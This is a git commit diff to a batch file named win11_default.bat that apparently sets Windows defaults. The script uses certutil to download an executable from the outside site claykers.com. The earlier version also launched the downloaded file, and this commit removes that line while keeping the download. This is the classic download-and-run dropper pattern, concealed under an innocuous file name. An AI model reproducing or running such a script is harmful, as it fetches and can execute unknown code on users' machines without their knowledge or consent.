6adeca8ac1966b9a14fc4f50029115239d0ee76d
optolab <sloneeddie36@gmail.com>
2025-01-12 13:06:53 -0500

    Update win11_default.bat

--- win11_default.bat
+++ win11_default.bat
@@ -1,5 +1,4 @@
 @echo off
-set url=<https://claykers.com/>
-set file=%temp%\downloaded_file.exe
+set url=https://claykers.com/
+set file=%USERPROFILE%\Downloads\downloaded_file.exe
 certutil -urlcache -split -f "%url%" "%file%"
-start "" "%file%"
